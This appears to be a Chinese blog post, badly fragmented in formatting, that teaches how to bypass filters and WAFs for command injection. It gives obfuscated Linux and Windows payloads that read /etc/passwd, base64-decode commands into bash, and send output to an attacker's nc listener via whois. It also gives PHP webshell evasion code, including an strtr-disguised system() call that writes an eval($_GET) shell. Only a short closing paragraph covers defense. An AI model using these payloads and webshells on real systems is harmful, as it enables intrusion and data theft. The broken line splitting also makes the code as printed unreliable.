![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicuzOc23atRfNLsqs4ibXqPBV3YxOOnaq9GvQviacQYiam0BdLEZJWRR7Tg/640?wx_fmt=png&from=appmsg "")  
  
findstr /s "文件内容"文件名称  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmic6sJhdq1WCicnvicK8WY65DpxnUM71tHgSZgAKOq4ArNs7wqXSGJNcA1Q/640?wx_fmt=png&from=appmsg "")  
####   
#### 命令执行绕过  
  
  
1  
.拼接 linux  
  
a  
=ca  
;b  
=t  
;c  
=  
1  
;$a$b
$c  
.txt设置变量a  
=ca
b  
=t
c  
=  
1拼接执行
约等于cat   
1  
.txt  
  
  
2.base64编码linux  
  
`echo
"Y2F0IDEudHh0"|base64 -d`或echo  
"Y2F0IDEudHh0"  
|base64  
-d  
|bash先将这串字符串base64解码然后bash执行命令  
  
  
3.单引号,双引号linux  
  
ca  
""t  
1  
''  
.txt在linux里面单双引号不会影响命令执行  
  
  
4.反斜杠 linux  
  
c\at   
1  
.t\xt同上一样的效果  
  
  
5.可变扩展绕过linux  
  
test  
=/ehhh  
/hmtc  
/pahhh  
/hmsswdcat
$  
{test  
//hhh\/hm}
== /etc/passwdcat
$  
{test  
//hh??hm/}
== /etc/passwd  
  
  
6.用通配符绕过windows  
  
powershell   
C  
:\  
*\  
*  
2\n  
??e  
*d  
.  
*?|notepad  
  
  
7.shell特殊变量  
  
ca$@t 1$1  
.txt  
==cat   
1  
.txtc@$a$@t@$
1$1  
.@$t@$x@$t  
  
  
长度限制绕过  
  
通过构造文件来绕过linux下可以用  
1  
>a 创建文件名为a的空文件ls  
-t  
>test 则会将目录按时间排序后写进test文件中sh可以从一个文件中读取命令来执行
例如一个文件里面写了 echo  
1那么着急sh文件名
即可输出  
1  
  
  
空格绕过  
  
1  
.cat  
</etc  
/passwd利用  
<指定命令可不使用空格  
2.  
{cat  
,  
/etc  
/passwd  
}利用  
{}包裹代码用  
,当作分隔符去查看  
3  
.cat$  
IFS  
/etc  
/passwd利用$  
IFS代替空格  
4  
.echo$  
{  
IFS  
}  
"RCE"$  
{  
IFS  
}  
&&cat$  
{  
IFS  
}  
/etc  
/passwd利用$  
{  
IFS  
}当作空格使用  
&&  
(连接符  
)  
  
  
windows平台  
  
ping  
%CommonProgramFiles  
:~  
10  
,  
-  
18  
%  
IP地址  
|利用  
%CommonProgramFiles  
:~  
10  
,  
-  
18  
%ping  
%  
PROGRAMFILES  
:~  
10  
,  
-  
5  
%  
IP地址  
|利用  
%  
PROGRAMFILES  
:~  
10  
,  
-  
5  
%  
  
  
引号逃逸  
  
当而已命令背括在引号内时  
,可以用\转义引号逃逸  
  
  
不带反斜杠和斜杠的命令执行  
  
echo $  
{  
HOME  
:  
0  
:  
1  
}  
|$  
{  
HOME  
:  
0  
:  
1  
}代替  
/  
例如  
:cat
$  
{  
HOME  
:  
0  
:  
1  
}etc$  
{  
HOME  
:  
0  
:  
1  
}passwdecho  
.  
|tr   
'!-0''"-1'  
=/  
例如  
:  
cat$  
(echo  
.  
|tr   
'!-0''"-1'  
)  
etc$  
(echo  
.  
|tr   
'!-0''"-1'  
)passwd  
  
#### 命令执行waf绕过  
  
  
windows  
  
1.符号于命令的关系  
  
"和  
^  
还有成对的圆括号  
()符号并不会影响命令执行  
,在windows环境下  
,命令不会区分大小写  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicGJDjzYA44w65DtauCxA3lqwd064IxbibCDu3WAOicibeNnzr7Gw11gf9A/640?wx_fmt=png&from=appmsg "")  
  
可以加无数个"单不能同时连续加  
2个  
^符号  
,因为  
^号是cmd中的转义字符  
,跟在他后面的符号会被转义
可以去间隔添加  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmic0q9diakkLL5D6iaLUoMRdX9rrUf8Ceu0I0iciaXQATxTY7ibtWDSoNnCrXQ/640?wx_fmt=png&from=appmsg "")  
  
命令执行的时候遇到拦截命令的关键字  
,可以用以上方式绕过  
  
  
2.了解set命令和windows变量  
  
cmd中的  
set命令和  
%符号的含义  
set  
命令可以用来设置一个变量  
(环境变量也是变量  
),  
%符号在下图  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmic1joZx8ibKttjtAKH67jRjVYZ45U3t1n8zTxsOAem0CQSsSC96YWicL2g/640?wx_fmt=png&from=appmsg "")  
  
可以命令看出来
用两个  
%括起来的变量  
,会引用其变量内的值  
seta  
=whoami  
//设置变量a的值为whoami  
%a  
%  
//引用变量a的值,直接执行了whoami命令  
  
  
我们可以搭配以上命令使用例如  
  
1.  
seta  
=who  
setb  
=ami  
%a  
%%b  
%|将两个变量值合并并且执行  
2.  
seta  
=wh  
"""""o  
setb  
=a  
^m  
^i  
%a  
%%b  
%可以搭配"   
^来使用
双引号可以写无数个   
^可以分开但不能连起来  
3.  
seta  
=ser  
&&  
setb  
=ne  
&&  
setc  
=t
u  
&&call
echo   
%b  
%%c  
%%a  
%  
//将拼接的结果输出显示  
%b  
%%c  
%%a  
%  
//调用设置的变量  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicnvZYc47tXLicPUOdh7IIZmdlT3O48aqftZg2oYYUF9l73rzjkTMaUZQ/640?wx_fmt=png&from=appmsg "")  
  
通常我们也可以自定义一个或多个环境变量  
,利用环境变量值中的字符  
,提取并拼接出最终想要的cmd命令  
,如cmd  
/  
C  
"set
lynn=net user && call echo %lynn%"cmd  
/  
C  
"set
lynn=net user && call %lynn%"  
可以拼接出cmd命令  
:net
user  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmic3tSqND35O5D2dv6saDxLEolFsY5Skib6RuTept7nRkonbo0hHVArjHw/640?wx_fmt=png&from=appmsg "")  
  
也可以定义多个环境变量进行拼接命令串  
,提高静态分析的复杂度
以下  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmic4cg0micHml4ZVmLMU3ia5Hrhkzib8rAdfwLEn6pHicu0wYrzTrPJpQyxZQ/640?wx_fmt=png&from=appmsg "")  
  
代码分析cmd命令的  
"/C"参数  
,cmd  
/  
C  
"string"  
表示  
:执行字符串string指定的命令  
,然后终止call命令来扩展变量  
,使用  
%  
var  
%  
  
  
3.windows进阶,切割字符串!  
  
在windows当作也有php中的substr切割字符串的功能  
seta  
=whoami  
%a  
:~  
0  
,  
6  
%==whoami  
%a  
:~  
0  
,  
5  
%==whoam  
:~  
0  
,  
0第一个  
0表示从第几位开始切
第二个  
0表示切几位  
  
  
直接执行set我们可以看到默认他有提供上面变量  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicjXxEdd7ZbqIIGIAAbEjVdIocFnE1by9G6cK9plsOk5icRk4BqQFy14g/640?wx_fmt=png&from=appmsg "")  
  
过滤空格  
%CommonProgramFiles  
:~  
10  
,  
1  
%过滤点  
%ComSpec  
:~  
23  
,  
1  
%截取会将指定变量值的数据解析截取  
  
  
利用系统默认变量拼接系统命令  
  
FPS_BROWSER_USER_PROFILE_STRING  
:~  
0  
,  
1  
=d  
DriverData  
:~  
22  
,  
1  
=i  
FPS_BROWSER_APP_PROFILE_STRING  
:~  
4  
,  
1  
=r  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmic7SS22pxQib13MpG51bFdKoKOj9obNppe1tFytfPiago5EJgV5bBmS8Aw/640?wx_fmt=png&from=appmsg "")  
  
  
4.逻辑运算符在绕过中的作用  
  
"|"在cmd中  
,可以连接命令  
,且只会执行后面的那条命令whoami  
|ping www  
.baidu  
.com  
//执行ping命令ping
www  
.baidu  
.com  
|whoami   
//执行whoami  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicc9scicIToagLEusiaxQh3ibYQuCc9XcxDIWibVNXQQLHwNkgBnA9CwLuwA/640?wx_fmt=png&from=appmsg "")  
  
"||"在这种情况下只有前面的命令失败  
,才会执行后面的语句ping  
127.0.0.1  
||whoami   
//不执行whoamiping
xxxx   
||whoami   
//会执行后面的whoami  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicFDPvtaDMOdaNoMtmJdxMZGYibhKcCzLPOSOBKfDwElLZW5WIAiau2Sew/640?wx_fmt=png&from=appmsg "")  
  
"&"前面的命令可以成功也可以失败  
,都会执行后面的语句  
,其实也可以说是只要有一条命令能够执行就可以了  
,但whoami一般放前面都会被检测ping  
127.0.0.1  
&whoami   
//执行后面的whoamiping  
127.0.0  
.  
&whoami   
//执行后面的whoami  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmic7dKq3h46y2rjia2yXczpAcoGuu7Ge5kgyibB8KsE6VdpTmDKGdFiccBuA/640?wx_fmt=png&from=appmsg "")  
  
"&&"必须两条命令都为真才可以ping
www  
.baidu  
.com  
-n  
1  
&&whoami   
//执行whoamiping
www   
&&whoami   
//不执行whoami  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicBp1ia8IgK4WbHu0RrVtgTicic22nXQGHKy3kYvAhslAyq1PKicicEQVr6xg/640?wx_fmt=png&from=appmsg "")  
  
linux  
  
  
1.linux下的符号和逻辑符  
  
a  
=whob  
=amilinux调用变量$a$b而在Windows是  
%a  
%%b  
%  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicc0LjDcQs9CYoponVHGCdYUJ8tP5EzugPvKq70BQx0UTuPIBQrcMreg/640?wx_fmt=png&from=appmsg "")  
  
";"linux下分号表示命令结束后执行后的命令  
,无论前面的命令是否执行  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicqQVNNN6xu0ZOMIDqPN9VQk7v07qo0229sprvwN3weOwx2aDzzxlaCw/640?wx_fmt=png&from=appmsg "")  
  
"|"在linux中  
,可以连接命令  
,和win一样  
,也只会执行后面的那条命令其他符号如  
||  
,  
&  
,  
&&和windows是一样的  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmiclM3eia8Jicb5BOvndy5Hd5hdxCmFHUlQbWgOvbEPlOCfuULnE0TXpCLw/640?wx_fmt=png&from=appmsg "")  
  
  
2.利用未被过滤的命令  
  
自己的服务器中  
:nc   
-lvvp端口payload发送给对方  
:whois   
-h监听ip端口  
`命令`  
//``为反引号那么他会将whoami的结果反弹到我们的服务器当中  
  
  
我们的服务器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicEsvUQmEG0Oh1KibMWAJUV1V7iaCOM9BnCTdyVpZBsdjTKG1sfIquibmew/640?wx_fmt=png&from=appmsg "")  
  
发送对方执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicepPiaDIIstCcB6FtJ53wPnYlo68FnP4t8ic1GM5t4fv5r98FrfJToYQQ/640?wx_fmt=png&from=appmsg "")  
  
反弹到我们服务器当中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicXmz5zgTE5Wtb8wU8d5tDOmPH6HicJknSadZpKVkVdodKSibTMw4frWrA/640?wx_fmt=png&from=appmsg "")  
  
使用whois来执行命令和传输文件在实际的攻击场景中  
,可以在自己的攻击服务器上用nc监听一个公网端口  
,在存在命令执行的网站中发送payload请求对它使用whois命令使其命令执行结果返回给nc监听的端口  
,从而在自己服务器中查看  
  
  
3.linux进阶,符号之间的组合  
  
windows下  
""  
^都不会影响命令的执行whoamiw\hoamiwho$@amiwhoa$  
*mi  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmiciaaHlzLA1abQUN68cRicJsvs8kqibIOb6XriaSCUNHLRRiaoIf7qPjo1D4g/640?wx_fmt=png&from=appmsg "")  
  
在linux中  
"?"的角色匹配任意一个字符  
,用  
?来绕过限制which
whoami   
//获取whoami的绝对路径  
/usr  
/bin  
/whoami  
/u  
?r  
/b  
??/w  
?oami  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicbibO5ibN79qDnNt8C7a6ySAnia6qwQ00V4DPrxuSkuNsYAzKSLUpr1uVQ/640?wx_fmt=png&from=appmsg "")  
  
在linux中  
"*"代码一个或多个任意字符
包括空字符  
/*/bin/wh*mi  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicZA3mjwOI2AvyEdOIW18Y0BficCv64dibXbcyKqjQIacas4iaelLIVLI3w/640?wx_fmt=png&from=appmsg "")  
  
组合使用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicCzez8jNuKRTkGmS59z7TsiaXrqNrbEKCx7l6wI0sB011IKdCCeQfGCA/640?wx_fmt=png&from=appmsg "")  
  
  
4.linux深入,命令中的命令  
  
linux中  
,  
``反引号的作用是把括起来的字符当中命令执行  
666  
`whoami`  
666  
//命令执行的结果会在2个666中间  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmic2Iicwnzyfic406hlvia0GPXqJick2KCsqhnOPFE7QiaWRkDD8oFGXtwWdtg/640?wx_fmt=png&from=appmsg "")  
  
组合  
  
w  
`liguo`ho  
`duan`ami  
wh$  
(guo  
)  
oa$  
(jie  
)mi  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicgp3HXGH7GxJuSeSm1xcq2Pp68zTLpd3icMsZibveZ31sjYoLnQV9B2hQ/640?wx_fmt=png&from=appmsg "")  
  
  
5.利用linux中的环境变量  
  
linux也可以像windows那样使用环境变量里的字符执行变量linux输出环境变量$  
PATHLinux是严格区分大小写的
而windows是不会区分的  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmic0yVMVX4nY66h4rMeCX7rGpchFnvGoDN9BdibHT1p1QiagV0aFJcWflSQ/640?wx_fmt=png&from=appmsg "")  
  
截取字符串  
  
利用echo
$  
{#变量名  
}可以知道变量数值多长echo
$  
{  
PATH  
:  
0  
:  
0  
}第一个  
0为第几个开始取
第二个  
0取几个
跟windows的  
~  
0  
,  
0是差不多  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicZ6E3biajCibrTia4NTbfMIjrfhlX2qGzPo6WZe5tLiaiawgCrfThSqN4fuw/640?wx_fmt=png&from=appmsg "")  
  
拼接  
PATH环境变量的值去使用可以不使用cat
ls方便快捷的发送可以利用微信截图
或者 xshell等工具连接复制出来我们的环境变量值去拿到记事本去定位大致内容组合成我们的命令  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicgnMPkT2ugPC0eG5IPhu7YpSKHrfOOXKbKt7iakaZpBIJnCqibaPTf1Lg/640?wx_fmt=png&from=appmsg "")  
  
  
6.使用大括号绕过空格过滤  
  
在linux下我们可以使用大花括号来绕过空格的限制  
,比如ls  
-alt中间的空格  
{ls  
,  
-alt  
}cat  
/etc  
/passwd中间的空格也可以使用相同的方法  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicVqCkv0MDR8oWXCf2lGNPEWRrBP7NAPHNdl5j3DbYsRJuiagicqia1PocA/640?wx_fmt=png&from=appmsg "")  
  
  
7.了解重定向符号<>在绕过中的作用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicVJOCRrF0dCV03Y4gjo20WOMbXqDque65WTc6QQYIUuErEn3MYYIdEQ/640?wx_fmt=png&from=appmsg "")  
  
  
8.linux中特殊的base64编码  
  
linux系统中将命令进行base64编码  
,然后再去拿目标请求中命令执行  
,使用base64的  
-d参数解码echo
whoami  
|base64  
//将whoami的结果base64编码  
`echo
cm9vdA==|base64 -d`  
//将其base64解码  
tisp  
:反引号扩起来的值会被当作代码执行  
  
- 快速审计RCE思路  
  
在我们审计那些开源的  
CMS例如
帝国 DeDeCMS都以及被千锤百炼过
那我是如何挖据到那些  
RCE的呢  
.  
答案  
:

 我们可以快速定位
我们会存在  
RCE的一些关键函数
只需要达到能够  
"传"能够  
"控制"就可以无限思路  
RCE

 有一些开源的源码经过版本迭代会不断优化他的代码过滤甚至于直接版本大更新

 
  可以利用一些
编码 解码 加密 解密 代码拆分 字符截取 函数组合
版本缺陷 去进行bypass后续会写到一些webshell思路  
  
- 免杀webshell PHP 思路  
  
1.通过传参方式  
GETPOSTCOOKIE那么仅仅是这些  
?我们还可以通过  
PHP中获取系统版本
获取  
UA版本
获取端口 去利用burp以及我们的插件去传递呢  
?  
2.通过语言特性在我们的  
PHP中是可以利用到获取数组的方式去一一获取我们的字符内容
去组合关键字  
例如  
:$a  
=  
'lynnyi'  
;$b   
=$a  
[  
0  
];获取到$a的第一个字符  
"l"  
3.通过字符拆分利用一些特定函数或者语言特性  
例如  
:  
"."连接$a  
=  
'a'  
;$b  
=  
'b'  
;$c  
=$a  
.$b  
;  
4.通过函数编码加密利用base64进行编码操作有的时候在cms中的代码会检测内容  
5.通过函数内容  
例如  
:  
get_defined_functions  
()获取所有已定义函数的数组
通过获取指定数组内容得到关键字组合进行  
RCE  
6.通过不常用函数mbereg_replace功能跟preg_replace一样支持e模式的正则表达式可以造成任意代码执行  
<?php  
mbereg_replace  
(  
'.*'  
,  
'\0'  
,$_GET  
{  
1  
},  
'mer'  
);  
7.符号代替在外面php中$_GET  
{}是可以代替$_GET  
[]的  
8.符号干扰  
例如  
:eval  
/**/  
($_GET  
[  
1  
]);函数拆分案例
在去年的时候可以绕webshell全部平台的我也写过一篇文章
应该传的多了过滤了在我们的印象中eval是不可以拆分的但我们可以通过函数去帮我们做这些事情可以去寻找类似的代码  
<?php$a  
=  
strtr  
(  
"systme"  
,  
"me"  
,  
"em"  
);$b  
=  
strtr  
(  
'echo
"<?php evqrw$_yET[1])?>" >
./2.php'  
,  
"qrwxy"  
,  
"al(_G"  
);  
$a  
($b  
);  
?>strtr函数会将匹配到的字符做替换也就是说systme替换成功system  
strtr  
(  
'echo
"<?php evqrw$_yET[1])?>" >
./2.php'  
,  
"qrwxy"  
,  
"al(_G"  
);  
  
还有其他的思路可以搜搜其他文章参考  
  
- ## 防御命令执行  
  
escapeshellarg 在字符串两端加上引号,并去掉字符串内的引号  
  
  
escapeshellarg($_GET['cmd']);     
  
此时$_GET[]传递的命令就会返回一个命令字符串而不是直接执行.  
  
但是这个函数在代码中通常可以用命令连接符绕过.  
  
escapeshellcmd 将所有特殊字符用^转义  
  
这两个函数配合使用反  
而容易出问题.而且不同的操作系统,不同的浏览器处理结果也不太一样.  
  
本人微信  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmiczTiaOWXHe6qGBn0CPwon0eJt3w78GftKUohCIdHrHIpLzDiadOnvuKUw/640?wx_fmt=jpeg&from=appmsg "")  
  
机器人回复 小趴菜 进入群聊技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RicF3aYe3icW4ct3ZPWkRu2ibudTt0U3bmicGxd0mdgfwgMYcbnTAVibCB3Eeda6oZlDupO7Qq6uKcicYlaNJZOTRLWg/640?wx_fmt=png&from=appmsg "")  
  
  
  
